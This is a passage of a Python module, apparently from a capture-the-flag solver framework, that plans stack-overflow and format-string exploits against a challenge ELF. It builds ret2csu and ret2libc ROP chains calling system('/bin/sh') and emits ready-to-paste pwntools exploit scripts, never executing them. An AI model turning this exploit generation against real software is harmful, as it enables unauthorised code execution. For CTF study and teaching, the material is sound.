    re-entry (`cmp rbx, rbp; jnz` passes after one iteration).  The called pointer is a GOT/data slot
    holding the target (classically a libc function resolved from a leak)."""
    notes = ["ret2csu: set edi/rsi/rdx through the universal csu gadgets when no direct pop gadgets exist"]
    csu_pop = _g(facts, _CSU_POP)
    csu_call = _g(facts, _CSU_CALL)
    fn_ptr = facts.got.get("system") or facts.got.get("printf")  # a resolvable GOT slot holding a libc fn
    arg1 = libc.get("arg1") if libc.get("arg1") is not None else facts.binsh  # None until supplied
    slots = [
        ChainSlot(_CSU_POP, csu_pop, "pop rbx=0, rbp=1, r12=&fn_ptr, r13=rdx, r14=rsi, r15=edi then ret"),
        ChainSlot("imm:rbx", 0, "rbx = 0 (index into [r12])"),
        ChainSlot("imm:rbp", 1, "rbp = 1 so `cmp rbx,rbp; inc; jnz` re-enters once (the rbp trick)"),
        ChainSlot("ptr:r12", fn_ptr, "r12 = address of a pointer to the target function (a GOT slot)",
                  placeholder="" if fn_ptr else "fn_ptr"),
        ChainSlot("imm:r13", libc.get("arg3", 0), "r13 -> rdx (3rd arg)"),
        ChainSlot("imm:r14", libc.get("arg2", 0), "r14 -> rsi (2nd arg)"),
        ChainSlot("imm:r15", arg1, "r15 -> edi (1st arg, e.g. &\"/bin/sh\")",
                  placeholder="" if arg1 is not None else "arg1"),
        ChainSlot(_CSU_CALL, csu_call, "mov rdx,r13; mov rsi,r14; mov edi,r15d; call [r12+rbx*8]"),
    ]
    use_align = _align_needed("ret2csu", facts.arch) if align is None else align
    if use_align:
        slots.insert(0, ChainSlot("align", _g(facts, "ret"), "16-byte alignment for the eventual glibc movaps"))
    if csu_pop is None or csu_call is None:
        notes.append("the __libc_csu_init universal gadgets are absent in this binary; ret2csu does not apply")
        return tuple(slots), "needs-offset", notes
    notes.append("edi is a 32-bit load (edi, not rdi): ret2csu passes only 32-bit first args; use for argc-like values or low &\"/bin/sh\"")
    conf = "concrete" if not any(s.value is None for s in slots) else ("needs-leak" if facts.mitigations.pie_on else "needs-offset")
    return tuple(slots), conf, notes


def _assemble_ret2libc(facts: BinaryFacts, *, libc: Mapping[str, int], align: bool | None):
    notes: list[str] = []
    system = libc.get("system")
    binsh = libc.get("/bin/sh") or libc.get("binsh") or facts.binsh
    if facts.arch == "i386":
        # cdecl: [system][ret-after][arg]
        slots = [
            ChainSlot("call:system", system, "system()", placeholder="" if system else "libc.system"),
            ChainSlot("ret_after", _g(facts, "ret"), "return address after system (unused)"),
            ChainSlot("arg:/bin/sh", binsh, "\"/bin/sh\"", placeholder="" if binsh else "libc.binsh"),
        ]
    else:
        pop_rdi = _g(facts, "pop rdi ; ret")
        slots = [ChainSlot("pop rdi ; ret", pop_rdi, "rdi = &\"/bin/sh\"")]
        slots.append(ChainSlot("arg:/bin/sh", binsh, "\"/bin/sh\" address", placeholder="" if binsh else "libc.binsh"))
        use_align = _align_needed("ret2libc", facts.arch) if align is None else align
        if use_align:
            slots.append(ChainSlot("align", _g(facts, "ret"), "16-byte stack alignment for glibc's movaps in system()"))
        slots.append(ChainSlot("call:system", system, "system(\"/bin/sh\")", placeholder="" if system else "libc.system"))
        if pop_rdi is None:
            notes.append("no `pop rdi ; ret` gadget in the binary; set rdi via ret2csu or a libc gadget")
    if system is None or binsh is None:
        notes.append("libc base not yet resolved: pass --opt libc=... or leak a libc symbol; system/\"/bin/sh\" stay placeholders")
        return tuple(slots), ("needs-leak"), notes
    conf = "concrete" if not any(s.value is None for s in slots) else "needs-leak"
    return tuple(slots), conf, notes


def _plan_format_write(facts: BinaryFacts, buffer_offset: int | None, notes: list[str]) -> ExploitPlan:
    steps = [LeakStep("libc_base", "format-string",
                      "a format string leaks stack/libc with %p/%s; the same bug writes with %n")]
    slots = [
        ChainSlot("fmt:leak", None, "stage 1: `%p %p %p ...` or `%N$p` to leak canary/PIE/libc and find the arg offset", placeholder="arg_offset"),
        ChainSlot("fmt:write", None, "stage 2: a positional %n write (use format_string_builder.build_got_overwrite once the target addr+value are known)", placeholder="target"),
    ]
    notes = notes + [
        "format-string primitive recognised; build the exact %n payload with solvers/toolkits/format_string_builder.py once the GOT target and value are known",
        "recognising a non-format leak oracle (echo/read-print loop) is left to a human/model (the B-025 residual)",
    ]
    return ExploitPlan("format_write", facts.arch, facts.bits, buffer_offset, tuple(steps), tuple(slots),
                       False, "needs-oracle", tuple(notes))


# BinaryFacts helper used by plan() (kept here to avoid a forward reference in the dataclass body).
def _libc_shell_in_binary(self: BinaryFacts) -> bool:
    """True when the binary itself imports/defines a shell-spawning libc call (so a ret2csu call
    through its GOT slot reaches `system` with no libc leak)."""
    return bool(self.libc_shell) or ("system" in self.symbols) or ("system" in self.got)


BinaryFacts.libc_shell_in_binary = _libc_shell_in_binary  # type: ignore[attr-defined]


# --------------------------------------------------------------------------- pwntools rendering

def _ident(role: str) -> str:
    """A slot role turned into a valid python identifier for a RESOLVE placeholder.  A gadget role
    like ``pop rdi ; ret`` carries spaces and semicolons, so using it verbatim would emit uncompilable
    code (``p64(pop rdi ; ret)``); slugging it yields a resolvable name (``pop_rdi_ret``)."""
    s = _re.sub(r"[^0-9a-zA-Z]+", "_", role).strip("_")
    return s or "slot"


def render_pwntools(p: ExploitPlan, facts: BinaryFacts, *, binary: str = "./chall", libc: str = "") -> str:
    """A ready-to-PASTE pwntools script for the plan.  It is text only; nothing here runs it."""
    arch = "amd64" if facts.bits == 64 else "i386"
    packer = "p64" if facts.bits == 64 else "p32"
    lines = [
        "#!/usr/bin/env python3",
        "# Generated by toolkits.pwn_autobuild (B-025) -- a PLAN. Review every value, then run it",
        "# ONLY against your assigned target, inside the pwn Docker image. Nothing here is executed.",
        "from pwn import *",
        "",
        f"context.update(arch={arch!r}, os='linux')",
        f"exe = ELF({binary!r}, checksec=False)",
    ]
    if libc:
        lines.append(f"libc = ELF({libc!r}, checksec=False)")
    lines.append("")
    lines.append(f"# strategy: {p.strategy}   confidence: {p.confidence}")
    off = p.buffer_offset if p.buffer_offset is not None else "OFFSET  # find with cyclic()/cyclic_find()"
    lines.append(f"offset = {off}")
    if p.leak_walk:
        lines.append("")
        lines.append("# --- leak walk (resolve these at runtime, in order) ---")
        for s in p.leak_walk:
            lines.append(f"#   leak {s.target} via {s.via}: {s.reason}")
    lines.append("")
    lines.append("payload  = b'A' * offset")
    for s in p.slots:
        comment = f"  # {s.note}" if s.note else ""
        if s.role == "canary":
            lines.append(f"payload += {packer}(canary){comment}")
        elif s.role in ("pad", "saved_rbp"):
            lines.append(f"payload += {packer}({s.value if s.value is not None else 0}){comment}")
        elif s.value is not None:
            lines.append(f"payload += {packer}({s.value:#x}){comment}")
        else:
            tag = s.placeholder or _ident(s.role)
            lines.append(f"payload += {packer}({tag})  # RESOLVE: {s.note}")
    lines.append("")
    lines.append("# io = remote(HOST, PORT)   # your assigned target only")
    lines.append("# io.sendline(payload)")
    lines.append("# io.interactive()")
    return "\n".join(lines) + "\n"


def plan_markdown(p: ExploitPlan, facts: BinaryFacts) -> str:
    """A human-readable plan for the workspace."""
    m = facts.mitigations
    out = [
        "# Stack pwn autobuild plan",
        "",
        f"- arch: `{facts.arch}` ({facts.bits}-bit)",
        f"- mitigations: NX={m.nx} PIE={m.pie} RELRO={m.relro} canary={m.canary} fortify={m.fortify}",
        f"- strategy: **{p.strategy}**   confidence: **{p.confidence}**"
        + ("   (alignment `ret` inserted)" if p.alignment_fixed else ""),
        f"- buffer offset: {p.buffer_offset if p.buffer_offset is not None else 'unknown (supply a crash value)'}",
        "",
    ]
    if p.leak_walk:
        out.append("## Leak walk")
        for s in p.leak_walk:
            out.append(f"1. **{s.target}** via *{s.via}* -- {s.reason}")
        out.append("")
    out.append("## Chain")
    out.append("| # | slot | value | note |")
    out.append("|---|------|-------|------|")
    for i, s in enumerate(p.slots):
        val = f"{s.value:#x}" if isinstance(s.value, int) else (f"<{s.placeholder}>" if s.placeholder else "<runtime>")
        out.append(f"| {i} | `{s.role}` | {val} | {s.note} |")
    out.append("")
    if p.notes:
        out.append("## Notes")
        for n in p.notes:
            out.append(f"- {n}")
        out.append("")
    if p.payload is not None:
        out.append(f"## Concrete payload ({len(p.payload)} bytes)")
        out.append("```")
        out.append(p.payload.hex())
        out.append("```")
    return "\n".join(out) + "\n"


# --------------------------------------------------------------------------- engine entry

_ELF_MAGIC = b"\x7fELF"


def _find_elves(challenge_dir: Path, *, cap: int = 64) -> list[Path]:
    found: list[Path] = []
    for p in sorted(challenge_dir.rglob("*")):
        if len(found) >= cap:
            break
        if not p.is_file() or p.is_symlink():
            continue
        if "recon" in p.relative_to(challenge_dir).parts:
            continue  # our own output / other engines' output, never a handout
        try:
            if p.stat().st_size < 20 or p.stat().st_size > MAX_BYTES:
                continue
            with p.open("rb") as fh:
                if fh.read(4) == _ELF_MAGIC:
                    found.append(p)
        except OSError:
            continue
    return found


def _opt_int(opts: Mapping, key: str) -> int | None:
    v = opts.get(key)
    if v is None:
        return None
    if isinstance(v, bool):
        raise AutobuildError(f"--opt {key} must be an integer, not a boolean")
    if isinstance(v, int):
        return v
    s = str(v).strip()
    try:
        return int(s, 0)
    except ValueError as e:
        raise AutobuildError(f"--opt {key}={v!r} is not an integer") from e


def solve(challenge_dir, profile, **opts):
    """Contract entry: recognise the ELF(s) in the handout, build an autobuild plan, write it to the
    workspace, and report.  Never runs the binary; a flag is returned only when it is literally in
    the binary's bytes."""
    from ctf.result import SolverResult, Evidence, Cost
    from ctf import flagfmt

    challenge_dir = Path(challenge_dir)
    elves = _find_elves(challenge_dir)
    if not elves:
        return SolverResult("blocked", notes="no ELF binary in the handout; pwn_autobuild plans against a local ELF",
                            engine="toolkits.pwn_autobuild")

    buffer_offset = _opt_int(opts, "buffer_offset")
    crash = _opt_int(opts, "crash")
    win = _opt_int(opts, "win")
    canary = _opt_int(opts, "canary")
    binsh = _opt_int(opts, "binsh")
    strategy = opts.get("strategy")
    align = opts.get("align")
    if isinstance(align, str):
        align = align.strip().lower() in ("1", "true", "yes", "on")

    ff = flagfmt.for_profile(profile) if profile is not None else None
    evidence: list = []
    flags: list[str] = []
    best = None  # (rank, strategy, plan, facts, path)
    rank_order = {"concrete": 0, "needs-leak": 1, "needs-offset": 2, "needs-oracle": 3,
                  "needs-recon": 4, "none": 5}
    out_root = challenge_dir / "recon" / "pwn_autobuild"

    for path in elves:
        data = path.read_bytes()
        if ff is not None:
            for f in ff.find_flags(data):
                if f not in flags:
                    flags.append(f)
                    evidence.append(Evidence("string", f"flag literal in {path.name}", path=str(path)))
        try:
            facts = recognize(data)
        except AutobuildError as e:
            evidence.append(Evidence("recon", f"{path.name}: {e}", path=str(path)))
            continue
        if binsh is not None:
            facts = dataclasses.replace(facts, binsh=binsh)
        off = buffer_offset
        if off is None and crash is not None:
            found = cyclic_find(crash, bits=facts.bits)
            if found >= 0:
                off = found
        p = plan(facts, buffer_offset=off, strategy=strategy, win=win, canary=canary, align=align)
        out_root.mkdir(parents=True, exist_ok=True)
        md = out_root / f"{path.name}.plan.md"
        py = out_root / f"{path.name}.exploit.py"
        md.write_text(plan_markdown(p, facts))
        py.write_text(render_pwntools(p, facts, binary=f"./{path.name}"))
        evidence.append(Evidence("plan", f"{path.name}: {p.strategy} ({p.confidence})", path=str(md)))
        r = rank_order.get(p.confidence, 9)
        if best is None or r < best[0]:
            best = (r, p, facts, path)

    if flags:
        return SolverResult("candidate", flags=tuple(flags), evidence=tuple(evidence),
                            notes="flag literal(s) found in the binary; a plan was also written to recon/pwn_autobuild/",
                            engine="toolkits.pwn_autobuild")
    if best is None:
        return SolverResult("blocked", evidence=tuple(evidence),
                            notes="ELF(s) present but unrecognisable or an unsupported architecture; see evidence",
                            engine="toolkits.pwn_autobuild")
    _r, p, facts, path = best
    if p.strategy == "none":
        return SolverResult("none", evidence=tuple(evidence),
                            notes=f"{path.name}: no stack-overflow or format-string surface recognised",
                            engine="toolkits.pwn_autobuild")
    summary = (f"{path.name}: {p.strategy} plan ({p.confidence})"
               + (f"; leak walk: {', '.join(s.target for s in p.leak_walk)}" if p.leak_walk else "")
               + "; run it by hand against the live target (plan engine, never executes)")
    return SolverResult("unsure", evidence=tuple(evidence), notes=summary, engine="toolkits.pwn_autobuild")


# --------------------------------------------------------------------------- standalone CLI

def main(argv: Sequence[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description="Stack ROP/format-string autobuilder (plan only, never runs).")
    ap.add_argument("elf", help="the local ELF to plan against")
    ap.add_argument("--strategy", default=None, help="force a strategy (ret2win/ret2syscall/ret2csu/ret2libc/format_write)")
    ap.add_argument("--win", default=None, help="win-function address (int, 0x ok)")
    ap.add_argument("--buffer-offset", default=None, help="padding to the saved return address")
    ap.add_argument("--crash", default=None, help="a leaked cyclic crash value; the offset is derived from it")
    ap.add_argument("--binsh", default=None, help="address of a \"/bin/sh\" string")
    ap.add_argument("--no-align", action="store_true", help="omit the amd64 alignment ret")
    ap.add_argument("--json", action="store_true", help="emit the plan as JSON")
    args = ap.parse_args(list(argv) if argv is not None else None)

    def _int(v):
        return None if v is None else int(str(v), 0)

    try:
        facts = recognize(args.elf)
        if args.binsh is not None:
            facts = dataclasses.replace(facts, binsh=_int(args.binsh))
        off = _int(args.buffer_offset)
        if off is None and args.crash is not None:
            found = cyclic_find(_int(args.crash), bits=facts.bits)
            off = found if found >= 0 else None
        p = plan(facts, buffer_offset=off, strategy=args.strategy, win=_int(args.win),
                 align=False if args.no_align else None)
    except (AutobuildError, OSError) as e:
        print(f"pwn_autobuild: {e}", file=sys.stderr)
        return 2
    if args.json:
        print(json.dumps({"facts": facts.as_dict(), "plan": p.as_dict()}, indent=2))
    else:
        print(plan_markdown(p, facts))
        print("# ---- pwntools ----")
        print(render_pwntools(p, facts, binary=f"./{Path(args.elf).name}"))
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
